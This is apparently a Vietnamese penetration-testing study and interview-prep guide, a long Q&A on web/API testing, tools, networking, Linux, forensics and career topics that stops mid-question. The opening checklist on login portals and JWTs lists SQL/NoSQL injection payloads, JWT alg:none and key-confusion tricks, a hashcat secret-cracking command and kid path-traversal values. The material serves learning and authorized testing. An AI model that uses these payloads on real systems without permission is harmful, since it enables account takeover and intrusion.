> Dưới đây là checklist chi tiết những việc thường làm:
> 
> 
> ### 🔐 PHẦN 1: PENTEST CỔNG ĐĂNG NHẬP (Login Portal)
> 
> **1. Kiểm tra User Enumeration (Dò tìm tài khoản)**
> *   Thử đăng nhập với username đúng + password sai, và username sai + password sai.
> *   Nếu thông báo lỗi khác nhau (ví dụ: "User not found" vs "Wrong password") → Lỗi User Enumeration. Kẻ tấn công biết được username nào tồn tại.
> 
> **2. Tấn công Brute Force & Rate Limiting**
> *   Gửi liên tục 100-1000 request đăng nhập sai. Nếu không bị chặn (Block IP, Captcha, Lockout) → Lỗi thiếu Rate Limit.
> *   Dùng wordlist (SecLists) để thử mật khẩu phổ biến.
> 
> **3. SQL Injection / NoSQL Injection**
> *   Thử payload: `' OR 1=1 --`, `admin'--`, `' OR '1'='1`.
> *   Với API JSON: `{"username": {"$ne": null}, "password": {"$ne": null}}` (NoSQL bypass).
> 
> **4. Bypass xác thực (Authentication Bypass)**
> *   **Force browsing:** Truy cập trực tiếp vào `/dashboard` hoặc `/admin` mà không cần đăng nhập. Nếu vào được → Lỗi phân quyền.
> *   **Parameter Tampering:** Sửa response từ `{"success": false}` thành `true`, hoặc sửa `"role":"user"` thành `"role":"admin"` trong request.
> 
> **5. MFA / 2FA Bypass**
> *   Thử truy cập trực tiếp vào endpoint sau khi login mà bỏ qua bước nhập OTP.
> *   Brute-force mã OTP (nếu không có Rate Limit).
> *   Sửa response trả về từ `{"otp_valid": false}` thành `true`.
> 
> **6. Session Management (Quản lý phiên)**
> *   **Session Fixation:** Ghi lại cookie trước và sau khi đăng nhập. Nếu cookie không thay đổi → Lỗi.
> *   Kiểm tra cờ bảo mật của Cookie: `HttpOnly`, `Secure`, `SameSite`.
> 
> 
> ### 🎫 PHẦN 2: PENTEST JWT (JSON Web Token)
> 
> **1. Algorithm Confusion (Nhầm lẫn thuật toán)**
> *   **`alg:none`:** Đổi header thành `{"alg":"none"}`, xóa phần signature. Nếu server chấp nhận → Bypass thành công.
> *   **RS256 → HS256:** Nếu server dùng RS256 (bất đối xứng), ta đổi thành HS256 (đối xứng) và dùng Public Key để ký token. (Đây là lab nổi tiếng của PortSwigger).
> 
> **2. Weak Secret Key (Khóa bí mật yếu)**
> *   Nếu server dùng HS256, ta có thể dùng `hashcat` hoặc `jwt_tool` để crack secret key.
> *   Lệnh: `hashcat -m 16500 jwt.txt rockyou.txt`
> 
> **3. Header Injection (Tiêm vào Header)**
> *   **`kid` (Key ID):** Thử Path Traversal (`"kid": "../../../../etc/passwd"`) hoặc SQL Injection (`"kid": "key1' UNION SELECT 'secret'--"`).
> *   **`jku` / `x5u`:** Trỏ đến server của mình chứa JWKS độc hại. Nếu server tự động tải về → Bypass.
> 
> **4. Payload Manipulation (Sửa dữ liệu)**
> *   Giải mã token (Base64), sửa `"role":"user"` thành `"role":"admin"`, hoặc `"user":"wiener"` thành `"user":"carlos"`.
> *   Sau đó ký lại token bằng secret key đã crack được (ở bước 2).
> 
> **5. Expiration & Replay (Hết hạn & Phát lại)**
> *   Kiểm tra xem server có validate trường `exp` (expiration) không. Nếu không, token cũ có thể dùng mãi mãi.
> *   Thử replay token cũ sau khi đã logout.
> 
> 
> ### 🛠️ CÔNG CỤ THƯỜNG DÙNG
> 
> | Mục đích                 | Công cụ                                       |
> | :----------------------- | :-------------------------------------------- |
> | Bắt request, sửa payload | **Burp Suite** (Repeater, Intruder)           |
> | Test API                 | **Postman**, **Insomnia**                     |
> | Crack JWT Secret         | **hashcat**, **john**                         |
> | Tấn công JWT tự động     | **jwt_tool**, **JWT Editor (Burp Extension)** |
> | Wordlist                 | **SecLists** (rockyou.txt, usernames.txt)     |
> 
> ---
> 
> ###  TÓM TẮT QUY TRÌNH CHUẨN
> 
> 1.  **Recon:** Tìm form đăng nhập, API endpoint, cách server cấp token.
> 2.  **Test Login:** Thử SQLi, Brute-force, User Enumeration, Bypass MFA.
> 3.  **Lấy JWT:** Đăng nhập thành công, copy token.
> 4.  **Decode JWT:** Xem header (alg, kid, jku) và payload (role, user, exp).
> 5.  **Tấn công JWT:** Thử `alg:none`, crack secret, sửa payload, tiêm header.
> 6.  **Leo thang đặc quyền:** Dùng token đã sửa để truy cập tài nguyên admin.
> 
> **Lưu ý pháp lý:** Chỉ thực hiện pentest trên hệ thống mà bạn được phép (lab, bug bounty, hoặc hệ thống của chính bạn).

Câu 106. alg none là gì?
Đáp án. Đây là trường hợp token khai báo thuật toán không ký; server không được chấp nhận kiểu cấu hình này nếu không có cơ chế bảo mật phù hợp.

Câu 107. BOLA là gì?
Đáp án. Broken Object Level Authorization là lỗi API không kiểm tra quyền của user đối với object được yêu cầu.

Câu 108. Mass Assignment là gì?
Đáp án. Là việc server tự động bind nhiều field từ input vào object, cho phép attacker sửa các thuộc tính không nên được client điều khiển.

Câu 109. Rate limiting là gì?
Đáp án. Là cơ chế giới hạn số request trong một khoảng thời gian hoặc theo một key để giảm abuse, brute force và quá tải.

Câu 110. Bạn test rate limit thế nào?
Đáp án. Xác định endpoint nhạy cảm, gửi chuỗi request có kiểm soát, theo dõi status và response, rồi đánh giá điểm server bắt đầu block hoặc throttle.

Câu 111. Cách dùng Postman trong pentest?
Đáp án.<u> Postman hữu ích để dựng, lưu và lặp lại API requests; Burp tiện cho intercept, chỉnh sửa và phân tích traffic trong browser</u> hoặc app.

Câu 112. Khi nào dùng Burp thay vì Postman?
Đáp án. Khi cần <u>quan sát traffic thật</u>, i<u>ntercept request, sửa request </u>ngay trong luồng hoặc kiểm tra Web application và API cùng lúc.

Câu 113. Business Logic testing bắt đầu từ đâu?
Đáp án. Hiểu workflow hợp lệ trước, sau đó thử thay đổi thứ tự bước, giá trị, actor, trạng thái và giới hạn để tìm trường hợp server không enforce đúng business rule.

Câu 114. API có thể bị SQLi không?
Đáp án. Có. API chỉ là giao diện; nếu backend xây SQL không an toàn thì SQL Injection vẫn có thể xuất hiện.

Câu 115. API có thể bị SSRF không?
Đáp án. Có. Nếu API nhận URL hoặc khiến server fetch resource từ destination do client kiểm soát thì có thể tồn tại SSRF.


# TẬP 7 – BURP SUITE, ZAP, NMAP, RECON


Câu 116. Burp Suite là gì?
Đáp án. Là bộ công cụ hỗ trợ Web và API security testing, nổi bật với proxy intercept, request manipulation và nhiều công cụ phân tích.

Câu 117. Burp Proxy dùng làm gì?
Đáp án. Intercept và quan sát HTTP request/response giữa client và server.

Câu 118. Repeater dùng để làm gì?
Đáp án. Gửi lại request nhiều lần với các thay đổi thủ công để kiểm tra behavior và vulnerability.

Câu 119. Intruder dùng để làm gì?
Đáp án. Tự động hóa việc thay đổi input trên một hoặc nhiều vị trí request cho các tác vụ như fuzzing hoặc kiểm thử có điều kiện.

Câu 120. HTTP History có ý nghĩa gì?
Đáp án. Nó giúp xem lại traffic đã đi qua proxy, endpoint, method, parameter, status và response.

Câu 121. Burp Scope là gì?
Đáp án. Dùng để xác định target nào thuộc phạm vi kiểm thử, giúp giảm nhiễu và giảm nguy cơ thao tác ngoài scope.

Câu 122. Burp CA Certificate là gì?
Đáp án. Là certificate dùng để Burp có thể MITM HTTPS traffic trong môi trường test mà browser hoặc client đã tin certificate của Burp.

Câu 123. OWASP ZAP là gì?
Đáp án. <u>Là công cụ Web security testing và proxy miễn phí, hỗ trợ spidering, scanning và manual testing.</u>

Câu 124. Burp và ZAP giống nhau ở đâu?
Đáp án. Cả hai đều hỗ trợ intercept HTTP traffic và security testing Web application.

Câu 125. Nmap là gì?
Đáp án. Là công cụ network discovery và port scanning phổ biến, dùng để xác định host, port, service và một số thông tin hệ thống.

Câu 126. TCP SYN scan là gì?
Đáp án. Là scan gửi SYN và phân tích phản hồi để suy luận trạng thái port mà không hoàn tất đầy đủ TCP handshake trong trường hợp điển hình.

Câu 127. -sS, -sT, -sU khác nhau thế nào?
Đáp án. -sS là TCP SYN scan; -sT dùng connect() TCP; -sU là UDP scan.

Câu 128. -sV dùng để làm gì?
Đáp án. Phát hiện hoặc fingerprint service version trên các port mở.

Câu 129. -O dùng để làm gì?
Đáp án. OS detection, suy luận hệ điều hành dựa trên network behavior.

Câu 130. -Pn có ý nghĩa gì?
Đáp án. Bỏ qua host discovery theo kiểu ping và coi target là up để tiếp tục scan.

Câu 131. -p- dùng để làm gì?
Đáp án. Quét toàn bộ khoảng port TCP thay vì chỉ các port mặc định phổ biến.

Câu 132. Dirsearch, Gobuster, Ffuf dùng để làm gì?
Đáp án. Chủ yếu dùng để khám phá path, directory, file hoặc parameter bằng fuzzing và wordlist.

Câu 133. Ffuf khác Gobuster thế nào?
Đáp án. Cả hai đều hỗ trợ fuzzing; Ffuf linh hoạt với nhiều vị trí fuzz và HTTP use cases, còn Gobuster tập trung vào các kiểu discovery phổ biến.

Câu 134. Nessus dùng ở đâu?
Đáp án. Nessus chủ yếu hỗ trợ vulnerability scanning trên host và network service, phù hợp để phát hiện nhiều issue đã biết.

Câu 135. Nmap có phải vulnerability scanner không?
Đáp án. Nmap chủ yếu là network discovery và port/service scanner; NSE có thể hỗ trợ một số security checks nhưng không tương đương một vulnerability scanner chuyên dụng.

============================================================
TẬP 8 – NETWORKING, TLS, DNS
============================================================

Câu 136. TCP/IP model gồm gì?
Đáp án. Có thể mô hình hóa thành Link, Internet, Transport và Application; trong thực tế có các cách ánh xạ khác nhau với OSI.

Câu 137. TCP và UDP khác nhau thế nào?
Đáp án. TCP hướng kết nối và cung cấp reliable ordered delivery; UDP không đảm bảo delivery hoặc ordering ở transport layer và có overhead thấp hơn.

Câu 138. TCP three-way handshake là gì?
Đáp án. Client gửi SYN, server trả SYN-ACK, client trả ACK để thiết lập kết nối TCP.

Câu 139. HTTPS hoạt động thế nào?
Đáp án. HTTPS là HTTP chạy trên TLS, giúp mã hóa traffic và xác thực server bằng certificate chain.

Câu 140. TLS handshake dùng để làm gì?
Đáp án. Nó giúp client và server thương lượng tham số, xác thực server và thiết lập khóa phiên để bảo vệ dữ liệu.

Câu 141. DNS là gì?
Đáp án. DNS ánh xạ tên miền sang thông tin như IP và các loại record khác.

Câu 142. A, AAAA, CNAME, MX, TXT là gì?
Đáp án. A ánh xạ IPv4; AAAA IPv6; CNAME alias; MX mail server; TXT chứa text records thường dùng cho nhiều mục đích như verification và email policy.

Câu 143. SSL và TLS khác nhau thế nào?
Đáp án. TLS là giao thức kế nhiệm SSL; tên “SSL” hiện thường được dùng như cách gọi quen thuộc cho TLS.

Câu 144. TLS bảo vệ được gì?
Đáp án. Chủ yếu cung cấp confidentiality, integrity và authentication của peer theo mô hình chứng thư, thường là server authentication.

Câu 145. HTTP header quan trọng nào cho security?
Đáp án. Tùy ứng dụng nhưng thường xem xét Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, Referrer-Policy, Cookie attributes và CORS headers.

Câu 146. X-Content-Type-Options: nosniff là gì?
Đáp án. Nó yêu cầu browser không tự suy đoán MIME type trong một số context và sử dụng loại nội dung do server khai báo.

Câu 147. HSTS là gì?
Đáp án. HTTP Strict Transport Security yêu cầu browser sử dụng HTTPS cho domain trong thời gian policy có hiệu lực.

Câu 148. DNS cache poisoning là gì?
Đáp án. Là việc làm cache DNS chứa thông tin phân giải giả, khiến client nhận địa chỉ không đúng.

Câu 149. Reverse DNS là gì?
Đáp án. Là quá trình tra từ IP về hostname thông qua PTR record.

Câu 150. NAT là gì?
Đáp án. Network Address Translation chuyển đổi địa chỉ IP hoặc port giữa các network context, thường được dùng để cho nhiều thiết bị dùng một địa chỉ public.

============================================================
TẬP 9 – LINUX
============================================================

Câu 151. Linux process là gì?
Đáp án. Là một instance đang thực thi của chương trình, có PID, memory space, file descriptor và trạng thái riêng.

Câu 152. ps dùng làm gì?
Đáp án. Xem process đang chạy và thông tin liên quan.

Câu 153. top dùng làm gì?
Đáp án. Theo dõi process và mức sử dụng CPU, memory theo thời gian thực hoặc gần thời gian thực.

Câu 154. grep dùng làm gì?
Đáp án. Tìm các dòng khớp với pattern trong text hoặc output.

Câu 155. awk dùng làm gì?
Đáp án. Xử lý và trích xuất dữ liệu dạng text theo field và pattern.

Câu 156. sed dùng làm gì?
Đáp án. Stream editor cho các thao tác tìm, thay thế và biến đổi text.

Câu 157. chmod 755 nghĩa là gì?
Đáp án. Owner có read, write, execute; group và others có read, execute.

Câu 158. /etc/passwd và /etc/shadow khác nhau thế nào?
Đáp án. /etc/passwd chứa thông tin account cơ bản; /etc/shadow chứa thông tin password hash và policy nhạy cảm trên Linux.

Câu 159. Pipe | là gì?
Đáp án. Chuyển stdout của command này thành stdin của command khác.

Câu 160. > và >> khác nhau thế nào?
Đáp án. > ghi đè file; >> nối thêm vào cuối file.

Câu 161. curl dùng để làm gì?
Đáp án. Gửi hoặc nhận dữ liệu qua nhiều protocol, đặc biệt hữu ích khi kiểm tra HTTP/HTTPS API.

Câu 162. wget dùng để làm gì?
Đáp án. Tải tài nguyên từ mạng và hỗ trợ nhiều workflow download qua HTTP/HTTPS và một số protocol khác.

Câu 163. SSH là gì?
Đáp án. Giao thức truy cập và quản trị từ xa an toàn, thường dùng để đăng nhập shell trên Linux.

Câu 164. Làm sao kiểm tra port đang listen trên Linux?
Đáp án. Có thể dùng ss, netstat hoặc lsof tùy hệ thống.

Câu 165. Làm sao xem IP và network interface?
Đáp án. Dùng ip addr hoặc ip link.

Câu 166. Process và thread khác nhau thế nào?
Đáp án. Process có address space riêng; thread chia sẻ address space trong cùng process nhưng có stack và execution state riêng.

============================================================
TẬP 10 – DIGITAL FORENSICS VÀ WIRESHARK
============================================================

Câu 167. Digital Forensics là gì?
Đáp án. Là quá trình thu thập, bảo toàn, phân tích và diễn giải bằng chứng số để trả lời câu hỏi liên quan đến một sự kiện hoặc incident.

Câu 168. Vì sao phải bảo toàn evidence?
Đáp án. Để giảm nguy cơ evidence bị thay đổi và đảm bảo kết quả phân tích có thể kiểm chứng.

Câu 169. Hash MD5 hoặc SHA256 dùng để làm gì?
Đáp án. Dùng để tạo fingerprint của dữ liệu, hỗ trợ kiểm tra tính toàn vẹn và nhận diện file.

Câu 170. File carving là gì?
Đáp án. Là kỹ thuật khôi phục file dựa trên cấu trúc hoặc signature của dữ liệu khi metadata hoặc filesystem entry không còn đầy đủ.

Câu 171. Metadata của file có thể cho biết gì?
Đáp án. Có thể gồm timestamp, creator, software, location hoặc các thuộc tính khác tùy định dạng.

Câu 172. Log analysis là gì?
Đáp án. Là phân tích các log để tìm sequence of events, user activity, authentication events, errors hoặc dấu hiệu tấn công.

Câu 173. Log nào thường hữu ích?
Đáp án. Tùy hệ thống có thể gồm web server logs, authentication logs, firewall logs, DNS logs, endpoint logs và application logs.

Câu 174. Wireshark dùng để làm gì?
Đáp án. Phân tích packet capture và network protocols để hiểu traffic, tìm lỗi và điều tra security events.

Câu 175. PCAP là gì?
Đáp án. Là packet capture, tập dữ liệu lưu các packet mạng đã được capture để phân tích.

Câu 176. Làm sao lọc HTTP traffic trong Wireshark?
Đáp án. Có thể dùng display filter như http hoặc lọc theo IP, port, host và các field protocol cụ thể.

Câu 177. Làm sao tìm IP đáng ngờ?
Đáp án. Phân tích endpoint, volume, timing, protocol, destination, domain resolution và đối chiếu với context của incident.

Câu 178. TCP stream là gì?
Đáp án. Là luồng dữ liệu của một TCP conversation được Wireshark tái dựng để dễ xem nội dung và trình tự trao đổi.

Câu 179. C2 traffic là gì?
Đáp án. Là communication giữa compromised host và command-and-control infrastructure để nhận lệnh hoặc gửi dữ liệu.

Câu 180. Dấu hiệu traffic đáng ngờ là gì?
Đáp án. Không có một dấu hiệu duy nhất; có thể xem xét beaconing đều đặn, destination lạ, DNS bất thường, payload bất thường hoặc hành vi lệch baseline.

Câu 181. Chain of Custody là gì?
Đáp án. Là hồ sơ ghi nhận việc evidence được thu thập, chuyển giao, lưu trữ và xử lý như thế nào.

Câu 182. Volatility dùng để làm gì?
Đáp án. Là framework phổ biến để phân tích memory image và tìm process, network connection, credential artifact hoặc dấu vết khác.

Câu 183. Disk Forensics và Network Forensics khác nhau thế nào?
Đáp án. Disk Forensics tập trung vào dữ liệu lưu trữ; Network Forensics tập trung vào network traffic và communication artifacts.

# TẬP 11 – CTF, SOURCE CODE REVIEW, PROGRAMMING


Câu 184. PTIT CTF bạn đã làm gì?
Đáp án. Em tham gia Team Blue_whale, vào vòng Finals và tập trung vào Web Security và Digital Forensics.

Câu 185. Challenge Web khó nhất của bạn là gì?
Đáp án. Khi trả lời thật, em nên chọn một challenge em nhớ rõ và trình bày theo chuỗi: nhận diện → phân tích → exploit → flag → bài học.

Câu 186. Khi bị stuck trong CTF bạn làm gì?
Đáp án. Em quay lại enumeration, đọc source, kiểm tra assumptions và thay đổi giả thuyết thay vì chỉ thử payload ngẫu nhiên.

Câu 187. CTF giúp gì cho pentest?
Đáp án. CTF rèn tư duy enumeration, debugging, exploit development và khả năng kết nối nhiều lỗ hổng thành một attack path.

Câu 188. Source code review dùng để làm gì?
Đáp án. Giúp đi từ triệu chứng của vulnerability đến root cause và hiểu chính xác dữ liệu hoặc quyền được xử lý thế nào.

Câu 189. Tìm SQLi trong PHP source thế nào?
Đáp án. Tìm nơi input của user đi vào query string và kiểm tra có parameterized query hay chỉ nối chuỗi trực tiếp.

Câu 190. Tìm XSS trong source thế nào?
Đáp án. Truy vết dữ liệu từ user input tới output sink và xác định có validation hoặc context-appropriate encoding hay không.

Câu 191. Tìm command injection thế nào?
Đáp án. Tìm input đi vào command execution APIs hoặc shell invocation và kiểm tra việc kiểm soát command hoặc argument.

Câu 192. Tìm file inclusion thế nào?
Đáp án. Tìm các hàm include hoặc file access nhận path từ user và xác định attacker có thể điều khiển path hay không.

Câu 193. Python hỗ trợ pentest gì?
Đáp án. Automation, HTTP requests, parsing response, fuzzing, data processing và xây PoC hoặc custom tools.

Câu 194. JavaScript hỗ trợ pentest gì?
Đáp án. Hiểu client-side logic, DOM, browser APIs, AJAX/fetch, endpoint discovery và các source/sink liên quan đến DOM XSS.

Câu 195. PHP quan trọng với Web Pentest vì sao?
Đáp án. Nhiều Web application dùng PHP; đọc PHP giúp hiểu routing, input handling, SQL queries, file operations và server-side logic.

Câu 196. SQL JOIN là gì?
Đáp án. JOIN kết hợp dữ liệu từ nhiều bảng dựa trên điều kiện liên kết giữa các cột.

Câu 197. INNER JOIN và LEFT JOIN khác nhau thế nào?
Đáp án. INNER JOIN chỉ lấy các dòng có match ở cả hai phía; LEFT JOIN giữ toàn bộ dòng bên trái và thêm dữ liệu bên phải khi có match.

Câu 198. Primary Key là gì?
Đáp án. Là khóa dùng để xác định duy nhất một record trong bảng.

Câu 199. Foreign Key là gì?
Đáp án. Là cột tham chiếu đến khóa của bảng khác để biểu diễn quan hệ và ràng buộc dữ liệu.

Câu 200. Vì sao pentester nên biết programming?
Đáp án. Programming giúp tự động hóa, đọc source, hiểu logic ứng dụng, viết PoC và xử lý các bài kiểm thử phức tạp hiệu quả hơn.

============================================================
TẬP 12 – PROJECT, BLOG, CV DEEP-DIVE
============================================================

Câu 201. Tại sao bạn xây dựng vulnerable PHP website?
Đáp án. Để chủ động mô phỏng các lỗi Web như File Upload, Insecure Design và Security Misconfiguration, từ đó hiểu cả góc nhìn developer và pentester.

Câu 202. Project vulnerable website có kiến trúc như thế nào?
Đáp án. Khi phỏng vấn, em nên mô tả chính xác kiến trúc thực tế của project: frontend, backend PHP, database và cách triển khai.

Câu 203. File Upload trong project hoạt động thế nào?
Đáp án. Em nên mô tả đúng implementation của project và chỉ ra validation nào cố tình yếu, sau đó trình bày cách secure tương ứng.

Câu 204. Insecure Design trong project nằm ở đâu?
Đáp án. Em nên chọn một workflow cụ thể mà business rule có thể bị lạm dụng, rồi giải thích expected behavior và actual behavior.

Câu 205. Security Misconfiguration trong project nằm ở đâu?
Đáp án. Em nên chỉ đúng cấu hình em đã tạo có chủ ý, ví dụ debug, quyền file hoặc service exposure nếu project thực sự có.

Câu 206. Bạn đã làm secure version chưa?
Đáp án. Nếu chưa, nói rõ chưa. Sau đó trình bày cách em sẽ khắc phục: secure defaults, server-side validation, least privilege và disable không cần thiết.

Câu 207. Vì sao bạn viết technical blog?
Đáp án. Viết blog giúp em hệ thống hóa kiến thức, lưu lại methodology và biến quá trình giải lab hoặc nghiên cứu thành tài liệu có thể xem lại.

Câu 208. Bài blog nào bạn tự tin nhất?
Đáp án. Chọn một bài em thực sự hiểu sâu và chuẩn bị được: mục tiêu, nguyên nhân, PoC, impact và remediation.

Câu 209. Bạn kiểm chứng PoC như thế nào?
Đáp án. Em kiểm tra trên môi trường lab hoặc target được phép, giữ PoC tối thiểu và xác minh rằng behavior đúng với root cause.

Câu 210. 70% Web Security Academy có ý nghĩa gì?
Đáp án. Nó cho thấy em đã thực hành trên nhiều nhóm vulnerability, nhưng mức độ hiểu sâu của từng topic vẫn cần được thể hiện qua câu hỏi và lab thực tế.

Câu 211. Lab nào khó nhất đối với bạn?
Đáp án. Chọn một lab thật sự từng khó và nói rõ điểm khó, cách em debug và điều em rút ra.

Câu 212. Vì sao bạn chưa hoàn thành 100%?
Đáp án. Trình bày trung thực theo thời gian và ưu tiên học tập; nhấn mạnh rằng em ưu tiên hiểu và thực hành có chiều sâu ở những topic đã học.

Câu 213. Vulnerability nào bạn hiểu sâu nhất?
Đáp án. Nên chọn topic em có thể giải thích từ nguyên nhân, detection, exploit, impact đến remediation và demo trực tiếp.

Câu 214. Vulnerability nào bạn yếu nhất?
Đáp án. Chọn một topic thật sự chưa sâu và nêu kế hoạch cụ thể để cải thiện, thay vì cố chứng minh rằng mình biết tất cả.

============================================================
TẬP 13 – TÌNH HUỐNG PENTEST THỰC CHIẾN
============================================================

Câu 215. Bạn được cấp một domain. Làm gì trước?
Đáp án. Xác nhận scope, thu thập subdomain và technology, enumerate endpoint, kiểm tra authentication surface rồi mới đi sâu vulnerability testing.

Câu 216. Bạn phát hiện login endpoint. Test gì?
Đáp án. Authentication bypass, brute force protection, rate limit, session management, password reset, enumeration, MFA và business logic.

Câu 217. User A đọc được dữ liệu User B. Làm gì?
Đáp án. Dùng hai account để reproduce, thay object identifier, xác định authorization failure, thu bằng chứng và đánh giá phạm vi impact.

Câu 218. API trả dữ liệu nhạy cảm. Đánh giá thế nào?
Đáp án. Xác định dữ liệu gì, actor nào có thể truy cập, điều kiện cần, phạm vi record và hậu quả nếu khai thác ở quy mô lớn.

Câu 219. API nhận URL. Bạn nghi SSRF. Làm gì?
Đáp án. Kiểm tra controlled callback hoặc destination test an toàn, sau đó xác nhận server có thực hiện outbound request và kiểm tra khả năng truy cập internal resources trong scope.

Câu 220. Upload .php bị chặn. Bạn kiểm tra gì tiếp?
Đáp án. Kiểm tra extension validation, MIME, content validation, filename handling, storage path, execution behavior và các bypass phù hợp trong môi trường được phép.

Câu 221. XSS payload không execute. Debug thế nào?
Đáp án. Xác định context, source, sink, encoding, sanitization và browser behavior; không chỉ thay payload ngẫu nhiên.

Câu 222. Application trả 403. Bạn làm gì?
Đáp án. Xác định 403 đến từ application, reverse proxy hay WAF, rồi kiểm tra authentication, authorization, route behavior và các request khác để hiểu nguyên nhân.

Câu 223. WAF chặn request. Bạn làm gì?
Đáp án. Trước hết xác định block reason. Chỉ thực hiện bypass trong scope và với mục tiêu kiểm chứng vulnerability; không biến việc bypass WAF thành mục tiêu tự thân.

Câu 224. Có vulnerability nhưng chưa đạt RCE. Có report không?
Đáp án. Có nếu vulnerability đã được xác minh và impact có ý nghĩa. Không cần đạt RCE mới được report.

Câu 225. Vulnerability khó exploit nhưng impact lớn. Đánh giá thế nào?
Đáp án. Tách exploitability khỏi impact và mô tả rõ điều kiện khai thác trong report thay vì bỏ qua một yếu tố.

Câu 226. Phát hiện dữ liệu khách hàng thật. Làm gì?
Đáp án. Dừng mở rộng dữ liệu, chỉ thu thập mức evidence tối thiểu cần thiết, bảo vệ dữ liệu và báo ngay theo quy trình của tổ chức.

Câu 227. Target downtime sau test của bạn. Làm gì?
Đáp án. Dừng hoạt động có thể gây thêm ảnh hưởng, thông báo ngay cho đầu mối chịu trách nhiệm và ghi lại request hoặc hành động đã gây sự cố.

============================================================
TẬP 14 – HR, TEAMWORK, THÁI ĐỘ
============================================================

Câu 228. Bạn muốn học gì khi vào team?
Đáp án. Em muốn học methodology thực tế, cách xử lý target lớn, chuẩn report, cách phối hợp với developer và cách đánh giá risk trong môi trường production.

Câu 229. Bạn làm việc nhóm thế nào?
Đáp án. Em ưu tiên chia nhỏ task, cập nhật tiến độ rõ ràng và chia sẻ evidence hoặc assumptions để teammate có thể tiếp tục công việc.

Câu 230. Bất đồng với teammate thì sao?
Đáp án. Em đưa vấn đề về evidence và mục tiêu kỹ thuật, thử reproduce rồi thống nhất dựa trên kết quả thay vì tranh luận theo cảm tính.

Câu 231. Task chưa biết làm thì sao?
Đáp án. Em xác định phần nào chưa biết, đọc tài liệu hoặc lab tương tự, thử nghiệm ở môi trường an toàn và hỏi senior khi đã có context cụ thể.

Câu 232. Bạn xử lý feedback thế nào?
Đáp án. Em xem feedback như dữ liệu để sửa skill hoặc cách làm, sau đó cập nhật process để tránh lặp lại lỗi.

Câu 233. Bạn thích Offensive hay Defensive Security?
Đáp án. Web Pentest hiện là hướng em muốn phát triển mạnh vì phù hợp kinh nghiệm hiện có, nhưng em cũng muốn hiểu defensive để đánh giá impact và detection tốt hơn.

Câu 234. Bạn có muốn theo Web Pentest lâu dài không?
Đáp án. Trước mắt có. Sau khi nền tảng Web/API vững hơn, em có thể mở rộng sang các mảng offensive khác tùy cơ hội.

Câu 235. Môi trường làm việc bạn mong muốn?
Đáp án. Môi trường có quy trình rõ, được review kỹ thuật, có cơ hội làm việc trên target thực tế và có người senior để học hỏi.

============================================================
TẬP 15 – 40 CÂU “BẮT BÀI CV” CUỐI CÙNG
============================================================

Câu 236. Bạn nói “Web & API Penetration Testing”. Một API pentest hoàn chỉnh gồm những gì?
Đáp án. Authentication, authorization, object-level access, input validation, rate limiting, business logic, error handling, data exposure và các lỗi Web backend phổ biến.

Câu 237. Bạn nói “OWASP Top 10”. OWASP Top 10 là gì?
Đáp án. Là tài liệu nhận diện các nhóm rủi ro Web application phổ biến; khi phỏng vấn nên tập trung vào cơ chế vulnerability và cách kiểm thử thay vì chỉ nhớ tên.

Câu 238. Bạn nói “Authentication Bypass”. Hãy giải thích một ví dụ.
Đáp án. Ví dụ ứng dụng bỏ qua một bước kiểm tra cần thiết khiến request không hợp lệ vẫn được xác thực hoặc cấp quyền; cần chứng minh bằng một workflow cụ thể.

Câu 239. Bạn nói “Broken Access Control”. Hãy cho ví dụ.
Đáp án. User thường có quyền xem object của mình nhưng có thể đổi ID để xem object của user khác do server không kiểm tra ownership.

Câu 240. Bạn nói “File Upload”. Điều kiện để có RCE là gì?
Đáp án. Không phải upload file là có RCE. Cần thêm điều kiện như file được lưu ở vị trí web-accessible, được server xử lý như code hoặc có một execution path phù hợp.

Câu 241. Bạn nói “SSRF”. Chỉ gửi request đến localhost có chắc là SSRF không?
Đáp án. Không. Cần chứng minh server thực sự thực hiện outbound request đến destination do attacker kiểm soát hoặc chịu ảnh hưởng.

Câu 242. Bạn nói “SSTI”. Chỉ thấy template syntax có đủ kết luận không?
Đáp án. Không. Cần xác nhận input được template engine evaluate ở server, thay vì chỉ được render như text.

Câu 243. Bạn nói “XXE”. XML hiện còn quan trọng không?
Đáp án. Tùy hệ thống và parser. Khi có XML input, vẫn cần kiểm tra cấu hình parser và khả năng xử lý external entity.

Câu 244. Bạn nói “Deserialization”. Có phải mọi deserialize đều nguy hiểm không?
Đáp án. Không. Rủi ro phụ thuộc loại format, nguồn dữ liệu, object model, gadget chain và cơ chế kiểm soát dữ liệu.

Câu 245. Bạn nói “Business Logic”. Làm sao tìm lỗi logic?
Đáp án. Hiểu workflow đúng trước, sau đó kiểm tra thứ tự bước, trạng thái, quyền, giới hạn, giá trị và việc lặp lại request.

Câu 246. Bạn nói “Burp Suite”. Tool nào bạn dùng nhiều nhất?
Đáp án. Repeater và Proxy là hai công cụ cốt lõi cho manual testing vì em có thể xem, sửa và gửi lại request để kiểm chứng.

Câu 247. Bạn nói “Nmap”. Một command đầu tiên bạn có thể dùng là gì?
Đáp án. Trong lab có thể bắt đầu bằng một scan phù hợp với scope để xác định host và port; command cụ thể phải phù hợp với network và rules of engagement.

Câu 248. Bạn nói “Wireshark”. Khi có PCAP, bạn làm gì trước?
Đáp án. Xác định thời gian, protocol, host chính, conversations và baseline traffic trước khi đi tìm anomaly.

Câu 249. Bạn nói “Digital Forensics”. Evidence quan trọng nhất là gì?
Đáp án. Không có một loại evidence luôn quan trọng nhất. Giá trị phụ thuộc câu hỏi điều tra; có thể là memory, disk artifact, logs hoặc network traffic.

Câu 250. Bạn nói “Linux proficiency”. Một pentester dùng Linux để làm gì?
Đáp án. Recon, scripting, networking, file processing, tool operation, privilege analysis và automation.

Câu 251. Bạn nói “JavaScript”. Vì sao Web Pentester cần JS?
Đáp án. Vì JS giúp hiểu client-side logic, DOM, API calls, browser security model và phát hiện các vấn đề như DOM XSS.

Câu 252. Bạn nói “Python”. Hãy kể một automation task.
Đáp án. Có thể tự động gửi HTTP requests, parse response, fuzz parameter, xử lý wordlist hoặc tổng hợp kết quả testing.

Câu 253. Bạn nói “PHP”. Tìm SQLi trong PHP như thế nào?
Đáp án. Tìm user input được nối vào SQL string, sau đó kiểm tra DB interaction và xác nhận có parameterization hay không.

Câu 254. Bạn nói “SQL”. UNION dùng để làm gì?
Đáp án. UNION kết hợp result set của các SELECT có cấu trúc tương thích.

Câu 255. Bạn nói “RESTful API”. REST là gì?
Đáp án. REST là phong cách kiến trúc dùng resource-oriented operations trên HTTP; API thực tế có thể tuân thủ REST ở mức khác nhau.

Câu 256. Bạn nói “HTTP/HTTPS”. HTTPS có mã hóa không?
